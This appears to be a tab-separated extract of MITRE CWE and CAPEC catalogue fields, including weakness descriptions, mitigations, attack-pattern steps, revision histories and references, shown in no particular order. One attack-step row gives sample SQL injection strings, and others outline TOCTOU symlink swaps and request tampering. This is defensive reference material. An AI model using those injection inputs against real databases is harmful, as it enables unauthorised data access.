13513	46	This effectively causes the regexp to accept substrings that match the pattern, which produces a partial comparison to the target. In some cases, this can lead to other weaknesses. Common errors include:                                                not identifying the beginning and end of the target string                   using wildcards instead of acceptable character ranges                   others
7813	103	Primary
23005	100	The MITRE Corporation
7027	45	Variant
8715	33	Troy Hunt
23875	62	updated Relationships, Taxonomy_Mappings
13337	39	2009-07-27
8523	28	Eric Dalci
20099	28	CWE Content Team
13014	28	CWE Content Team
10348	28	CWE Content Team
12404	28	CWE Content Team
23772	70	Detecting browsers javascript hacks
13248	28	CWE Content Team
11949	28	CWE Content Team
24709	26	Implementation
15663	62	updated Common_Consequences, Description, Name, Relationships, Taxonomy_Mappings, Weakness_Ordinalities
22084	23	The software contains a mechanism for users to recover or change their passwords without knowing the original password, but the mechanism is weak.
6635	78	Medium
23244	91	Implementation
10746	28	CWE Content Team
20325	56	ChildOf
11950	39	2011-06-01
18862	81	Confidentiality
18384	51	2014-06-23
23744	47	Other
16395	62	updated Common_Consequences, Other_Notes
11815	62	updated Common_Consequences
12354	81	Other
20766	69	Incomplete
11485	74	1
16596	35	MITRE
11160	88	Path Traversal: '\\UNC\share\name\' (Windows UNC Share)
12932	30	Robert Lemos
23051	39	2011-09-13
10911	39	2008-08-01
11957	31	1000
14379	23	The software imports, requires, or includes executable functionality (such as a library) from a source that is outside of the intended control sphere.
10464	28	CWE Content Team
14628	91	Architecture and Design
16200	73	Inject command delimiters using web test frameworks (proxies, TamperData, custom programs, etc.)
20844	104	495
7780	26	Architecture and Design
8063	104	257
6343	42	Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.                   OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.                   This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.                   Be careful to avoid CWE-243 and other weaknesses related to jails.
14041	63	Varies by Context
14138	92	Explore
17901	103	Primary
21847	35	MITRE
11014	25	Medium
9901	86	http://msdn.microsoft.com/en-us/library/ms533046.aspx
10822	81	Availability
23328	35	MITRE
11648	90	Language-Independent
13822	62	updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Detection_Factors, Modes_of_Introduction, Observed_Examples, Potential_Mitigations, References
17238	100	The MITRE Corporation
18305	28	CWE Content Team
5624	40	Lack of anti-jam features in 802.11
16800	35	MITRE
8078	47	Read Data
16269	28	CWE Content Team
21132	61	Draft
9152	35	MITRE
17294	100	The MITRE Corporation
17479	35	MITRE
13526	39	2008-09-08
7481	100	The MITRE Corporation
14031	39	2009-12-28
8918	62	updated Relationships, Taxonomy_Mappings
24740	35	MITRE
20057	35	MITRE
15378	28	CWE Content Team
6328	103	Primary
24928	73	Port mapping. Identify ports that the system is listening on, and attempt to identify inputs and protocol types on those ports.
9836	39	2019-01-03
21049	40	Some level of physical access to the device being attacked.
14638	101	CAPEC Content Team
10531	31	1000
16067	35	MITRE
9424	62	updated Relationships, Weakness_Ordinalities
22465	63	Modify Application Data
11979	39	2018-03-27
18488	39	2010-02-16
6146	28	CWE Content Team
19034	62	updated Relationships
23263	27	None: No specialized resources are required to execute this type of attack.
12043	28	CWE Content Team
20786	88	Cleartext Storage of Sensitive Information in GUI
18281	81	Access Control
17119	35	MITRE
18370	28	CWE Content Team
20848	35	MITRE
20136	79	Access Control
6747	31	1000
21701	62	added/updated demonstrative examples
17573	47	Unreliable Execution
18062	56	ChildOf
13849	39	2014-07-30
18610	70	Busting Frame Busting: a Study of Clickjacking Vulnerabilities on Popular Sites
20831	26	Architecture and Design
16330	28	CWE Content Team
11136	33	Standard C++ Foundation
14799	35	MITRE
24145	104	273
17114	54	Low
8109	31	1000
12117	35	MITRE
11299	104	830
13727	35	Cigital
17324	35	MITRE
14620	86	http://threatpost.com/en_us/blogs/dll-hijacking-facts-and-fiction-082610
6511	90	Language-Independent
11399	69	Draft
23938	43	Simple
8797	28	CWE Content Team
17638	35	MITRE
19988	31	1000
8063	23	The storage of passwords in a recoverable format makes them subject to password reuse attacks by malicious users. In fact, it should be noted that recoverable encrypted passwords provide no significant benefit over plaintext passwords since they are subject not only to reuse by malicious attackers but also by malicious insiders. If a system administrator can recover a password directly, or use a brute force search on the available information, the administrator can use the password on other accounts.
11795	48	01
10607	81	Availability
10711	39	2014-07-30
11713	56	ChildOf
7940	39	2009-10-29
21716	85	416
6826	62	updated Potential_Mitigations
11040	79	Authorization
9827	96	2013-02-15
24232	78	Medium
6940	39	2010-09-27
8125	42	When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.
15601	39	2012-05-11
21682	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
20419	62	updated Common_Consequences
16464	39	2011-06-27
11342	48	09
23175	56	CanPrecede
23368	55	CAPEC Content Team
11367	62	updated Related_Attack_Patterns
9867	28	Eric Dalci
15070	80	There are tools to brute force session ID. Those tools require a low level of knowledge.
25234	91	Operation
11003	53	The MITRE Corporation
14080	28	CWE Content Team
9229	79	Integrity
7159	91	Implementation
12617	22	10
15704	62	updated Relationships, Type
15145	28	CWE Content Team
18058	28	CWE Content Team
8293	62	updated Potential_Mitigations, Time_of_Introduction
11878	93	Defense in Depth
5832	28	CWE Content Team
23111	91	Testing
16416	57	Primary
16560	31	1000
15240	39	2017-11-08
6383	62	updated Relationships
15405	35	MITRE
10203	55	CAPEC Content Team
21474	56	Requires
17100	40	An attacker needs to correctly guess the entity with which the victim does business and impersonate it. Most of the time phishers just use the most popular banks/services and send out their "hooks" to many potential victims.
20619	69	Incomplete
20095	26	Implementation
16821	43	Simple
14006	39	2008-09-08
24377	59	Updated Related_Weaknesses
13152	47	Bypass Protection Mechanism
15050	97	DTD Injection
12125	77	Automated Static Analysis - Source Code
23804	47	Read Data
10788	35	MITRE
20788	39	2009-05-27
20683	42	If certificate pinning is being used, ensure that all relevant properties of the certificate are fully validated before the certificate is pinned, including the full chain of trust.
11365	35	MITRE
6223	39	2009-05-27
18403	28	CWE Content Team
10124	33	Amit Klein
22193	21	CWE Content Team
22733	39	2008-09-08
11048	28	CWE Content Team
19763	88	Session Fixation
7558	28	Eric Dalci
11775	28	CWE Content Team
24879	97	Rooting SIM Cards
19120	39	2009-01-12
22257	35	MITRE
20989	47	Bypass Protection Mechanism
15084	69	Incomplete
11283	35	MITRE
22977	31	1000
17419	35	MITRE
10228	43	Composite
14942	81	Other
24834	104	125
22980	28	CWE Content Team
9539	62	updated Observed_Examples, References, Relationships, Type
24895	70	URL Encoded Attacks - Attacks using the common web browser
21799	97	Malicious Logic Inserted Into Product Software by Authorized Developer
15864	35	MITRE
17694	92	Experiment
7285	56	ChildOf
14391	35	MITRE
6340	55	CAPEC Content Team
15401	55	CAPEC Content Team
24706	72	A program may crash or block if it runs out of random numbers.
9850	92	Exploit
18310	62	updated Potential_Mitigations
22683	28	KDM Analytics
19035	104	29
22519	39	2011-06-01
20713	100	The MITRE Corporation
13441	39	2008-07-01
13884	44	High
25313	28	CWE Content Team
18434	35	MITRE
22023	62	updated Modes_of_Introduction, Relationships
21613	28	CWE Content Team
12998	79	Confidentiality
8336	35	MITRE
16452	62	updated Demonstrative_Examples
19339	62	updated Relationships
11004	79	Availability
23477	62	updated Relationships
23453	26	Implementation
15839	39	2011-03-29
23925	28	CWE Content Team
8236	35	MITRE
21871	28	CWE Content Team
8787	28	Eric Dalci
10514	35	MITRE
21109	69	Draft
11103	100	The MITRE Corporation
23176	39	2012-10-30
22038	103	Primary
16885	92	Explore
8818	74	2
8984	59	Updated References
23681	81	Other
12334	77	Architecture or Design Review
16554	28	CWE Content Team
10519	39	2019-01-03
7041	28	CWE Content Team
16623	73	Determine minimum and maximum allowed password lengths.
16418	31	699
20983	78	Medium
21012	104	1101
12655	39	2009-10-29
19869	103	Primary
13171	45	Base
7946	101	CAPEC Content Team
23258	62	updated Description, Relationships, Observed_Example, Other_Notes, Weakness_Ordinalities
24238	28	CWE Content Team
18765	61	Stable
9237	62	updated Relationships
21178	44	SOAR Partial
12180	28	CWE Content Team
22058	28	CWE Content Team
8827	63	Gain Privileges or Assume Identity
18630	73	Use web application debugging tool such as WebScarab, Tamper Data or TamperIE to analyze the information exchanged between the client and the server
7896	39	2012-05-11
24563	28	CWE Content Team
10877	62	updated Modes_of_Introduction, References, Relationships
8186	62	updated Time_of_Introduction
20648	62	updated Relationships
9335	62	updated Potential_Mitigations
16849	35	Cigital
13556	35	MITRE
19729	60	28
11705	39	2009-03-10
7614	40	XML queries used to process user input and retrieve information stored in XML documents
15336	31	1000
19051	63	Read Application Data
19804	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
11864	81	Access Control
6395	62	updated Time_of_Introduction
12207	35	Cigital
13235	47	Read Data
21623	28	CWE Content Team
22315	62	updated Common_Consequences
21395	35	MITRE
19171	62	updated Applicable_Platforms, Common_Consequences, Relationships, Taxonomy_Mappings
12667	35	MITRE
12982	39	2011-06-01
21775	28	CWE Content Team
15268	39	2017-11-08
18505	91	Implementation
9899	35	MITRE
12786	74	3
24628	39	2009-03-10
24023	73	The attacker leverages iFrame overlay capabilities to craft a malicious iFrame overlay page.
11715	31	1000
14546	56	ChildOf
17841	43	Simple
20316	28	CWE Content Team
11333	39	2014-07-30
20083	100	The MITRE Corporation
13439	74	3
6557	39	2009-12-28
6479	42	Rather than failing on a lack of random numbers, it is often preferable to wait for more numbers to be created.
17764	62	updated Description
11259	72	The attacker can gain access to otherwise unauthorized resources.
10988	35	MITRE
10649	63	Hide Activities
18900	89	Detailed
23218	39	2013-07-17
11236	43	Simple
7615	79	Access Control
12713	23	The software constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component.
15055	39	2014-07-30
9545	62	updated Relationships, Taxonomy_Mappings
17501	100	The MITRE Corporation
21152	76	2019-04-04
22674	28	CWE Content Team
18136	39	2012-05-11
9271	80	Arbitrary code execution
10409	77	White Box
7451	86	https://developer.apple.com/documentation/code_diagnostics/undefined_behavior_sanitizer/null_reference_creation_and_null_pointer_dereference
24232	61	Stable
17351	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180, CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass whitelist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control.                   Consider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content.
6791	39	2019-06-20
18927	31	1000
20738	88	Improper Neutralization of Special Elements in Data Query Logic
20456	39	2017-11-08
6966	79	Confidentiality
23717	85	76
18564	66	NULL Pointer Dereference [CWE-476]
14270	90	PHP
7132	79	Authorization
23009	35	MITRE
25019	62	updated Demonstrative_Examples, Relationships
16420	102	ChildOf
21068	35	MITRE
24875	62	updated Relationships, Taxonomy_Mappings
23053	72	This weakness may lead to a buffer overflow. Buffer overflows often can be used to execute arbitrary code, which is usually outside the scope of a program's implicit security policy. This can often be used to subvert any other security service.
12740	39	2009-05-27
23852	35	MITRE
22604	72	The communications between components can be modified in unexpected ways. Unexpected commands can be executed, bypassing other security mechanisms. Incoming data can be misinterpreted.
18697	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit
9674	28	CWE Content Team
12653	59	Updated Related_Weaknesses
8915	28	CWE Content Team
8851	104	315
18236	101	CAPEC Content Team
19558	100	The MITRE Corporation
21050	62	updated Relationships
20175	28	CWE Content Team
23404	101	CAPEC Content Team
19760	56	ChildOf
6858	63	Modify Memory
17520	92	Exploit
19897	56	ChildOf
14257	43	Simple
15928	81	Confidentiality
18068	62	updated Demonstrative_Examples
10768	32	The Wikimedia Foundation, Inc
9146	62	updated Relationships, Taxonomy_Mappings
20442	86	http://pragtob.wordpress.com/2012/03/06/secure-your-rails-apps/
11027	59	Updated Related_Attack_Patterns
18576	62	updated Relationships
13453	77	Automated Static Analysis - Binary or Bytecode
11756	35	MITRE
7824	62	updated Applicable_Platforms, Demonstrative_Examples, Modes_of_Introduction, Relationships
9320	62	updated Common_Consequences
24222	35	MITRE
14467	23	A function or operation returns an incorrect return value or status code that does not indicate an error, but causes the product to modify its behavior based on the incorrect result.
10385	31	1000
16296	31	1000
21528	35	MITRE
11675	103	Primary
7789	62	updated Common_Consequences
14117	35	MITRE
13455	62	updated Relationships
9967	28	CWE Content Team
15422	28	Eric Dalci
7578	40	The target host has a deadlock condition. There are four conditions for a deadlock to occur, known as the Coffman conditions. [R.25.3][REF-6]
12720	43	Simple
24608	55	CAPEC Content Team
11207	102	ChildOf
12808	62	updated Time_of_Introduction
24790	60	15
9945	39	2014-07-30
15409	36	http://projects.webappsec.org/Remote-File-Inclusion
24996	62	updated Potential_Mitigations, Time_of_Introduction
17743	47	Bypass Protection Mechanism
22203	59	Updated Attack_Motivation-Consequences
6680	62	updated Potential_Mitigations
17248	62	updated Common_Consequences
7612	61	Draft
6544	66	Two Security Vulnerabilities in the Spring Framework's MVC
17419	62	updated Related_Attack_Patterns
14082	21	PLOVER
13056	28	CWE Content Team
12920	45	Base
18278	81	Access Control
7300	36	https://code.google.com/archive/p/doctype/wikis/ArticleXSSInUrlAttributes.wiki
9626	54	Low
10048	30	Thomas Schreiber
7266	45	Variant
19972	62	updated Demonstrative_Examples, Potential_Mitigations
14905	62	updated Relationships
7347	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
12633	56	ChildOf
17372	35	MITRE
24611	35	MITRE
17267	25	Low
13960	74	2
7457	35	MITRE
12462	79	Accountability
14375	81	Other
9973	59	Updated References
8638	101	CAPEC Content Team
25282	35	MITRE
9695	28	CWE Content Team
9974	74	1
13023	45	Base
24294	39	2010-12-13
21232	35	MITRE
6034	86	https://developer.mozilla.org/en-US/docs/Web/JavaScript/Equality_comparisons_and_sameness
12328	45	Variant
11109	59	Updated Related_Attack_Patterns
23376	68	Checking the return value of the function will typically be sufficient, however beware of race conditions (CWE-362) in a concurrent environment.
24940	46	This can have security implications when the expected synchronization is in security-critical code, such as recording whether a user is authenticated or modifying important state information that should not be influenced by an outsider.             A race condition occurs within concurrent environments, and is effectively a property of a code sequence. Depending on the context, a code sequence may be in the form of a function call, a small number of instructions, a series of program invocations, etc.             A race condition violates these properties, which are closely related:                                                Exclusivity - the code sequence is given exclusive access to the shared resource, i.e., no other code sequence can modify properties of the shared resource before the original sequence has completed execution.                   Atomicity - the code sequence is behaviorally atomic, i.e., no other thread or process can concurrently execute the same sequence of instructions (or a subset) against the same resource.                                          A race condition exists when an "interfering code sequence" can still access the shared resource, violating exclusivity. Programmers may assume that certain code sequences execute too quickly to be affected by an interfering code sequence; when they are not, this violates atomicity. For example, the single "x++" statement may appear atomic at the code layer, but it is actually non-atomic at the instruction layer, since it involves a read (the original value of x), followed by a computation (x+1), followed by a write (save the result to x).             The interfering code sequence could be "trusted" or "untrusted." A trusted interfering code sequence occurs within the program; it cannot be modified by the attacker, and it can only be invoked indirectly. An untrusted interfering code sequence can be authored directly by the attacker, and typically it is external to the vulnerable program.
19740	39	2009-01-12
23614	62	updated Related_Attack_Patterns
22568	39	2017-11-08
15295	62	updated References, Relationships, Taxonomy_Mappings
18483	28	CWE Content Team
10623	39	2011-06-01
8896	39	2008-07-01
18774	89	Standard
17955	48	11
7705	31	1000
21608	74	1
16511	39	2017-05-03
13670	39	2014-02-18
19364	79	Authentication
10963	101	CAPEC Content Team
18281	72	An attacker will be able to gain access to any resources that are allowed by the extra privileges. Common results include executing code, disabling services, and reading restricted data.
16998	28	CWE Content Team
25411	73	Use application-level data modification tools such as Tamper Data, WebScarab, TamperIE, etc.
9966	40	The adversary must identify a programmatic means for interacting with a buffer, such as vulnerable C code, and be able to provide input to this interaction.
19990	76	2018-07-31
11284	85	571
25372	81	Availability
19053	74	3
15048	39	2008-07-01
9015	35	MITRE
21631	39	2010-12-13
16574	25	High
10715	54	High
12453	21	PLOVER
13175	28	CWE Content Team
13445	104	448
22877	35	MITRE
23463	103	Primary
16745	62	updated Related_Attack_Patterns
18400	62	updated Taxonomy_Mappings, Weakness_Ordinalities
25048	28	CWE Content Team
10683	94	Documents and materials improperly disposed of can lead to information disclosure if an adversary comes across it.
15954	59	Updated Related_Attack_Patterns
8499	62	updated Relationships, Taxonomy_Mappings
15853	62	updated Relationships, Taxonomy_Mappings
16902	39	2010-02-16
18559	104	61
22698	62	updated Observed_Examples
22393	46	This can lead to resultant weaknesses when the required properties change, such as when the software is ported to a different platform or if an interaction error (CWE-435) occurs.
24980	73	Use a proxy tool to record all links visited during a manual traversal of the web application.
15873	73	Manually inspect the application to find entry points.
19241	39	2012-05-11
22060	81	Other
14447	91	Architecture and Design
14715	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
17472	53	The MITRE Corporation
18217	56	CanPrecede
17043	39	2008-07-01
15130	28	CWE Content Team
11302	68	The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.
9975	35	MITRE
22824	39	2017-05-03
7282	100	The MITRE Corporation
14166	35	MITRE
15399	49	2010
14169	62	updated Relationships, Taxonomy_Mappings
13094	62	updated Relationships
20078	81	Other
14742	35	MITRE
23613	100	The MITRE Corporation
15224	88	Operation on a Resource after Expiration or Release
12956	62	updated Applicable_Platforms
12510	39	2012-05-11
18486	103	Primary
18506	62	updated Description
15043	62	updated Relationships, Taxonomy_Mappings
13885	76	2017-08-04
8610	56	ChildOf
21291	76	2018-07-31
18233	32	Defense Advanced Research Projects Agency (DARPA)
8501	25	Medium
16537	35	MITRE
12901	81	Other
14442	103	Primary
13393	39	2014-07-30
5862	26	Implementation
24485	35	MITRE
18706	56	ChildOf
22449	47	Gain Privileges
24851	28	Sean Eidemiller
20985	28	CWE Content Team
15611	31	699
16066	39	2017-11-08
21049	97	USB Memory Attacks
10543	49	2010
22983	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Configuration Checker
24389	67	High
12167	56	ChildOf
6269	39	2011-03-29
8337	35	MITRE
9561	95	[Determine how to inject information into the queries]Determine how to inject information into the queries from the previous step such that the injection does not impact their logic. For example, the following are possible injections for those queries:                   "5' OR 1=1; --"and"5) OR 1=1; --"and"ordernum DESC; --"
23483	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
8924	39	2010-04-05
5970	54	Low
14752	81	Availability
13550	54	Medium
10138	91	Build and Compilation
6638	35	MITRE
17683	50	Avoid viewing logs with tools that may interpret control characters in the file, such as command-line shells.
13809	26	Operation
8521	101	CAPEC Content Team
22318	28	CWE Content Team
21850	35	MITRE
11695	62	updated Time_of_Introduction
19355	35	MITRE
12422	46	When a user clicks a link to an external site ("target"), the target="_blank" attribute causes the target site's contents to be opened in a new window or tab, which runs in the same process as the original page. The window.opener object records information about the original page that offered the link.  If an attacker can run script on the target page, then they could read or modify certain properties of the window.opener object, including the location property - even if the original and target site are not the same origin.  An attacker can modify the location property to automatically redirect the user to a malicious site, e.g. as part of a phishing attack. Since this redirect happens in the original window/tab - which is not necessarily visible, since the browser is focusing the display on the new target page - the user might not notice any suspicious redirection.
23286	91	Operation
7686	39	2011-06-01
14165	28	CWE Content Team
5660	59	Updated Resources_Required
11149	56	ChildOf
14809	102	ChildOf
23348	56	ChildOf
11595	79	Access Control
22140	61	Draft
17754	23	An attacker modifies the HTTP Verb (e.g. GET, PUT, TRACE, etc.) in order to bypass access restrictions. Some web environments allow administrators to restrict access based on the HTTP Verb used with requests. However, attackers can often provide a different HTTP Verb, or even provide a random string as a verb in order to bypass these protections. This allows the attacker to access data that should otherwise be protected.
23493	39	2008-09-08
18553	54	Low
19080	39	2008-09-08
21432	94	Run Arbitrary Code
17065	28	CWE Content Team
13063	90	Language-Independent
17136	102	ChildOf
19035	69	Incomplete
19444	62	updated Common_Consequences, References, Relationships
17000	62	updated Relationships
6918	28	CWE Content Team
12395	63	Read Application Data
8339	28	CWE Content Team
11365	28	CWE Content Team
9833	79	Confidentiality
19665	69	Incomplete
10401	39	2009-07-27
21963	63	Gain Privileges or Assume Identity
18151	80	Ability to read, interpret, and subsequently alter manufacturer's documentation to cause errors in design specifications.
11735	102	ChildOf
25255	31	1000
16479	91	Implementation
22054	95	[Replace file with a symlink to a sensitive system file.] Between the time that the application checks to see if a file exists (or if the user has access to it) and the time the application actually opens the file, the attacker replaces the file with a symlink to a sensitive system file.
22564	35	Cigital
13136	72	Integrity checks usually use a secret key that helps authenticate the data origin. Skipping integrity checking generally opens up the possibility that new data from an invalid source can be injected.
24898	35	MITRE
17422	24	MITRE
10476	30	Lieven Desmet
5644	91	Architecture and Design
15651	56	ChildOf
14178	39	2019-06-20
17728	57	Primary
25416	76	2018-07-31
18549	31	1000
16540	30	SAFECode
19562	62	updated Common_Consequences
23871	72	The attacker can gain access to otherwise unauthorized resources.
12376	36	http://www.cert.org/advisories/CA-1997-05.html
15065	57	Primary
11792	32	The Open Web Application Security Project (OWASP)
6886	22	02
6148	104	89
19020	81	Integrity
15501	46	This issue makes it more difficult to maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
23786	42	Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.
23102	28	CWE Content Team
20897	69	Draft
18475	28	CWE Content Team
15831	28	Eric Dalci
12428	31	1000
19048	35	MITRE
15818	28	CWE Content Team
25347	22	09
21623	39	2008-09-08
12178	62	updated Potential_Mitigations
7316	76	2017-05-01
18918	39	2017-01-19
7776	100	The MITRE Corporation
11851	31	1000
14975	51	2014-06-23
21179	62	updated Potential_Mitigations
11605	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
16161	39	2008-07-01
11143	28	CWE Content Team
19603	35	Cigital
17690	59	Updated Attack_Phases, Attack_Prerequisites, Description, Description Summary, Related_Attack_Patterns, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity
6791	28	CWE Content Team
19565	42	For platforms such as ASP that do not generate new values for sessionid cookies, utilize a secondary cookie. In this approach, set a secondary cookie on the user's browser to a random value and set a session variable to the same value. If the session variable and the cookie value ever don't match, invalidate the session, and force the user to log on again.
17084	35	Cigital
19207	28	CWE Content Team
10669	51	2017-04-15
22995	39	2014-07-30
14639	39	2012-10-30
19194	21	7 Pernicious Kingdoms
6803	63	Gain Privileges or Assume Identity
21263	28	CWE Content Team
9466	62	updated Demonstrative_Examples, Relationships
8951	62	updated Description, Other_Notes
22030	62	updated Common_Consequences
24604	39	2011-06-01
21755	56	ChildOf
5834	62	updated Time_of_Introduction
20396	23	One or more system settings or configuration elements can be externally controlled by a user.
16662	104	780
10689	91	Implementation
13939	45	Class
16416	69	Draft
8717	62	updated Relationships
17276	66	Off-by-one errors: a brief explanation
18448	44	SOAR Partial
9785	97	XSS Targeting Non-Script Elements
24922	28	CWE Content Team
23162	104	294
12323	21	CLASP
7626	62	updated Description, Name
21300	59	Updated Related_Attack_Patterns
17351	91	Implementation
22124	55	CAPEC Content Team
8952	74	1
13128	101	CAPEC Content Team
9863	62	updated Time_of_Introduction
22167	39	2019-01-03
18709	66	Computer Security: Art and Science
17659	39	2013-02-21
19926	102	CanAlsoBe
12001	62	updated Relationships
16674	28	CWE Content Team
15836	66	Security issues with using PHP's escapeshellarg
13752	81	Availability
22421	81	Integrity
15058	56	ChildOf
16219	55	CAPEC Content Team
21455	35	MITRE
18997	53	The MITRE Corporation
13872	35	MITRE
6081	96	2018-07-02
15932	42	Pay close attention to complex conditionals that affect initialization, since some conditions might not perform the initialization.
15959	81	Integrity
21675	39	2012-05-11
22760	28	CWE Content Team
14784	39	2011-06-27
20284	81	Confidentiality
6400	62	updated Relationships, Type
18205	56	ChildOf
13549	100	The MITRE Corporation
8368	39	2009-07-27
9186	103	Primary
21069	31	1000
13036	39	2009-03-10
24125	62	updated Time_of_Introduction
21083	42	Run the code in an environment that performs automatic taint propagation and prevents any command execution that uses tainted variables, such as Perl's "-T" switch. This will force the program to perform validation steps that remove the taint, although you must be careful to correctly validate your inputs so that you do not accidentally mark dangerous inputs as untainted (see CWE-183 and CWE-184).
19467	39	2014-07-30
10870	28	CWE Content Team
21018	28	CWE Content Team
20891	45	Variant
10213	35	MITRE
25363	79	Authorization
13535	59	Updated Attack_Prerequisites, Description Summary, Examples-Instances, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
21037	23	The software does not correctly calculate the size to be used when allocating a buffer, which could lead to a buffer overflow.
12819	42	Most mitigating technologies at the compiler or OS level to date address only a subset of buffer overflow problems and rarely provide complete protection against even that subset. It is good practice to implement strategies to increase the workload of an attacker, such as leaving the attacker to guess an unknown value that changes every program execution.
24763	35	MITRE
19091	35	MITRE
11725	33	Shaun Clowes
24079	78	Medium
22609	100	The MITRE Corporation
20475	39	2012-10-30
23021	43	Simple
18156	62	updated Potential_Mitigations
15524	63	Modify Files or Directories
18329	76	2015-11-09
20519	66	Designing a Framework Method for Secure Business Application Logic Integrity in e-Commerce Systems
19063	33	Shaun Clowes
13149	56	ChildOf
18077	62	updated References, Relationships, Taxonomy_Mappings
20455	28	CWE Content Team
20163	39	2017-11-08
23206	35	MITRE
14762	39	2012-10-30
12800	80	Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.
15301	28	CWE Content Team
15132	28	CWE Content Team
18949	97	XSS Using MIME Type Mismatch
17447	81	Confidentiality
21376	28	CWE Content Team
9670	61	Stable
16146	33	Alexey Tyurin
23462	28	CWE Content Team
5877	24	MITRE
11720	39	2008-11-24
18018	43	Simple
15644	28	CWE Content Team
8317	35	Cigital
13515	62	updated Relationships
16207	28	CWE Content Team
9954	28	CWE Content Team
17241	21	PLOVER
20805	72	Conversion between signed and unsigned values can lead to a variety of errors, but from a security standpoint is most commonly associated with integer overflow and buffer overflow vulnerabilities.
22329	28	CWE Content Team
7914	25	Medium
22557	42	If the program must fail, ensure that it fails gracefully (fails closed). There may be a temptation to simply let the program fail poorly in cases such as low memory conditions, but an attacker may be able to assert control before the software has fully exited. Alternately, an uncontrolled failure could cause cascading problems with other downstream components; for example, the program could send a signal to a downstream process so the process immediately knows that a problem has occurred and has a better chance of recovery.
10078	39	2010-09-27
8782	61	Draft
10731	39	2008-07-01
22055	21	PLOVER
13554	39	2008-09-08
5694	28	CWE Content Team
18588	43	Simple
20089	90	Language-Independent
13863	39	2008-09-08
13450	31	1003
11331	24	MITRE
10643	39	2010-09-27
23948	25	Low
19043	39	2019-01-03
15737	31	699
20973	39	2019-01-03
14492	81	Access Control
9921	28	CWE Content Team
20331	31	1000
9904	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
7266	87	Web Server
6224	39	2012-10-30
20895	28	CWE Content Team
12809	39	2011-06-27
14508	23	The software performs too many data queries without using efficient data processing functionality such as stored procedures.
10805	45	Variant
8538	39	2008-09-08
9255	81	Access Control
20589	42	Be especially careful to validate all input when invoking code that crosses language boundaries, such as from an interpreted language to native code. This could create an unexpected interaction between the language boundaries. Ensure that you are not violating any of the expectations of the language with which you are interfacing. For example, even though Java may not be susceptible to buffer overflows, providing a large argument in a call to native code might trigger an overflow.
6859	93	Limited
10986	62	updated Time_of_Introduction
24900	28	CWE Content Team
18569	39	2012-10-30
11685	79	Access Control
19350	39	2012-10-30
19485	35	MITRE
13916	56	ChildOf
15212	26	Architecture and Design
7418	28	CWE Content Team
11991	46	It is dangerous to rely on implicit casts between signed and unsigned numbers because the result can take on an unexpected value and violate assumptions made by the program.             Often, functions will return negative values to indicate a failure. When the result of a function is to be used as a size parameter, using these negative return values can have unexpected results. For example, if negative size values are passed to the standard memory copy or allocation functions they will be implicitly cast to a large unsigned value. This may lead to an exploitable buffer overflow or underflow condition.
20108	35	MITRE
25247	76	2019-09-30
6009	39	2019-06-20
17338	28	CWE Content Team
8382	28	CWE Content Team
16680	35	MITRE
11436	76	2017-05-01
16977	81	Confidentiality
18075	39	2012-05-11
8654	91	Architecture and Design
23154	40	An application that manipulates the DOM via client-side scripting.
17448	39	2009-07-27
15605	88	Improper Handling of Undefined Values
16422	61	Stable
22650	47	Modify Data
17192	28	CWE Content Team
20612	63	Other
14923	81	Access Control
15038	35	MITRE
7838	27	None: No specialized resources are required to execute this type of attack. Having knowledge of the way the target site has been structured, in order to create a fake version, is required. Poisoning the resolver requires knowledge of a vulnerability that can be exploited.
21575	42	Use other functions that require explicit paths. Making use of any of the other readily available functions that require explicit paths is a safe way to avoid this problem. For example, system() in C does not require a full path since the shell can take care of it, while execl() and execv() require a full path.
20767	33	Chris Cornutt
25221	26	System Configuration
14230	42	Place constants on the left. If one attempts to assign a constant with a variable, the compiler will of course produce an error.
23026	39	2010-12-13
13109	33	Manish S. Saindane
23955	26	Implementation
10494	81	Access Control
23824	28	CWE Content Team
14884	28	CWE Content Team
11841	35	MITRE
10711	35	MITRE
7001	74	1
22370	39	2019-06-20
21531	62	updated Relationships, Taxonomy_Mappings
7697	43	Simple
24921	92	Exploit
7081	35	MITRE
